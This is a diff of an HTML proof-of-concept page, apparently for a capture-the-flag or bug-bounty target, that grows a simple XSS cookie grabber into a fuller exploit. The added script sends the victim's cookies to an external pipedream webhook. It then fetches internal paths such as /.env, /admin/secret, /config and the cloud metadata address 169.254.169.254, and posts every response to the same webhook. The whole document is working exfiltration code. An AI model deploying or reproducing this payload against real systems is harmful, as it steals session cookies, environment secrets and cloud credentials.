@@ -2,12 +2,42 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XSS PoC</title>
+  <title>XSS PoC - Full Exploit</title>
 </head>
 <body>
-  <h1>Testing PDF-based XSS</h1>
+  <h1>Testing PDF-based XSS with multi-fetch</h1>
+
   <script>
-    fetch("https://eohno0sqc09cpky.m.pipedream.net?cookie=" + document.cookie);
+    const webhook = "https://eohno0sqc09cpky.m.pipedream.net";
+
+    const urls = [
+      "/flag",
+      "/admin/secret",
+      "/.env",
+      "/config",
+      "http://169.254.169.254/latest/meta-data/"
+    ];
+
+    fetch(`${webhook}?info=document.cookie&value=` + encodeURIComponent(document.cookie));
+
+    urls.forEach(async (url) => {
+      try {
+        const res = await fetch(url);
+        const text = await res.text();
+
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ url, result: text })
+        });
+      } catch (err) {
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ url, error: err.message })
+        });
+      }
+    });
   </script>
 </body>
 </html>
